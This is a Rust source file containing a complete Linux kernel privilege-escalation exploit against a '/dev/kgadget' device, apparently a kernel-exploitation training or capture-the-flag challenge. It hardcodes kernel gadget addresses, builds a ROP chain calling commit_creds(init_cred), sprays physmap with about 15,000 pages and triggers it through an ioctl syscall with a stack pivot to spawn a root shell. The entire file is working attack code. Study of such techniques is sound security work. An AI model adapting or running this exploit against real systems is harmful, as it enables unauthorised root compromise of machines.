#![feature(asm_const)]
use anyhow::{self, Context, Ok};
use colored::*;
use core::arch::asm;
use libc::{self, c_void};
use std::arch::global_asm;
use std::fs::OpenOptions;
use std::fs::{self, File};
use std::io::{self, Read, Write};
use std::io::{BufRead, BufReader};
use std::os::fd::AsRawFd;

const commit_creds: *const c_void = 0xffffffff810c92e0 as *const c_void;
const prepare_kernel_cred: *const c_void = 0xffffffff810c9540 as *const c_void;
const swapgs_restore_regs_and_return_to_usermode: *const c_void =
    (0xffffffff81c00fb0 as u64 + 27) as *const c_void;
const init_cred: *const c_void = 0xffffffff82a6b700 as *const c_void;
const dev_fd: i32 = 0x3;
const pop_rdi_ret: *const c_void = 0xffffffff8108c6f0 as *const c_void;
const pop_rax_ret: *const c_void = 0xffffffff810115d4 as *const c_void;
const pop_rsp_ret: *const c_void = 0xffffffff811483d0 as *const c_void;
const _pop_rsp_ret: u64 = 0xffffffff811483d0;
const add_rsp_0xe8_pop_rbx_pop_rbp_ret: *const c_void = 0xffffffff812bd353 as *const c_void;
const add_rsp_0xd8_pop_rbx_pop_rbp_ret: *const c_void = 0xffffffff810e7a54 as *const c_void;
const add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret: *const c_void =
    0xffffffff810737fe as *const c_void;
const ret: *const c_void = 0xffffffff8108c6f1 as *const c_void;
static mut user_cs: *const c_void = 0 as *const c_void;
static mut user_ss: *const c_void = 0 as *const c_void;
static mut user_sp: *const c_void = 0 as *const c_void;
static mut user_rflags: *const c_void = 0 as *const c_void;
const try_hit: usize = 0xffff888000000000 + 0x7000000;
fn save_status() {
    unsafe {
        asm! {
            "mov {user_cs}, cs",
            "mov {user_ss}, ss",
            "mov {user_sp}, rsp",
            "pushf",
            "pop {user_rflags}",
            user_cs = out(reg) user_cs,
            user_ss = out(reg) user_ss,
            user_sp = out(reg) user_sp,
            user_rflags = out(reg) user_rflags,

        };
    }
    println!("{}", format!("[*] Status has been saved.").red().bold());
}

fn get_root_shell() {
    println!(
        "{}",
        format!("[+] Backing from the kernelspace.").red().bold()
    );
    if unsafe { libc::getuid() } != 0 {
        eprintln!("{}", "[x] Failed to get the root!".blue().bold());
        std::process::exit(-1);
    }
    println!(
        "Successful to get the root.\n
         Execve root shell now..."
    );
    std::process::Command::new("/bin/sh")
        .status()
        .expect("failed to execute process");
}

fn construct_rop_chain(rop: *mut *const c_void, page_size: i64) {
    let mut idx: usize = 0;
    unsafe {
        while idx < (page_size as usize / 8 - 0x30) {
            *rop.add(idx) = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;
            idx += 1;
        }

        while idx < (page_size as usize / 8 - 0x10) {
            *rop.add(idx) = ret;
            idx += 1;
        }

        *rop.add(idx) = pop_rdi_ret;
        idx += 1;
        *rop.add(idx) = init_cred;
        idx += 1;
        *rop.add(idx) = commit_creds;
        idx += 1;
        *rop.add(idx) = swapgs_restore_regs_and_return_to_usermode;
        idx += 1;
        *rop.add(idx) = 0xdeadbeef as *const c_void;
        idx += 1;
        *rop.add(idx) = 0xdeadbeef as *const c_void;
        idx += 1;
        *rop.add(idx) = get_root_shell as *const c_void;
        idx += 1;
        *rop.add(idx) = user_cs;
        idx += 1;
        *rop.add(idx) = user_rflags;
        idx += 1;
        *rop.add(idx) = user_sp;
        idx += 1;
        *rop.add(idx) = user_ss;
    }
}

fn main() -> anyhow::Result<()> {
    save_status();
    let fd = OpenOptions::new()
        .write(true)
        .read(true)
        .open("/dev/kgadget")?;

    assert_eq!(fd.as_raw_fd(), 0x3);
    let page_size = unsafe { libc::sysconf(libc::_SC_PAGESIZE) };
    let mut physmap_spray_arr: Vec<*mut c_void> = vec![std::ptr::null_mut(); 16000];
    unsafe {
        physmap_spray_arr[0] = libc::mmap(
            std::ptr::null_mut(),
            page_size as usize,
            libc::PROT_READ | libc::PROT_WRITE,
            libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
            -1,
            0,
        );
        construct_rop_chain(physmap_spray_arr[0] as *mut *const c_void, page_size);
        println!("{}", format!("[*] Spraying physmap...").red().bold());
        let mut index = 1;
        while index < 15000 {
            physmap_spray_arr[index] = libc::mmap(
                std::ptr::null_mut(),
                page_size as usize,
                libc::PROT_READ | libc::PROT_WRITE,
                libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
                -1,
                0,
            );
            assert!(
                physmap_spray_arr[index] != libc::MAP_FAILED as *mut _,
                "oops for physmap spray!"
            );
            libc::memcpy(
                physmap_spray_arr[index],
                physmap_spray_arr[0],
                page_size as libc::size_t,
            );
            index += 1;
        }
        println!(
            "{}",
            format!("[*] trigger physmap one_gadget...").red().bold()
        );
    };

    unsafe {
        asm!(
            "mov r15,   0xbeefdead;",
            "mov r14,   0x11111111;",
            "mov r13,   0x22222222;",
            "mov r12,   0x33333333;",
            "mov rbp,   0x44444444;",
            "mov rbx,   0x55555555;",
            "mov r11,   0x66666666;",
            "mov r10,   0x77777777;",
            "mov r9,    {pop_rsp_ret};",
            "mov r8,    {try_hit};",
            "mov rax,   0x10;",
            "mov rcx,   0xBBBBBBBB;",
            "mov rdx,   {try_hit};",
            "mov rsi,   0x1bf52;",
            "mov rdi,   {dev_fd}",
            "syscall",
             try_hit = const try_hit,
             dev_fd = const dev_fd,
             pop_rsp_ret = const _pop_rsp_ret,
        )
    };
    Ok(())
}
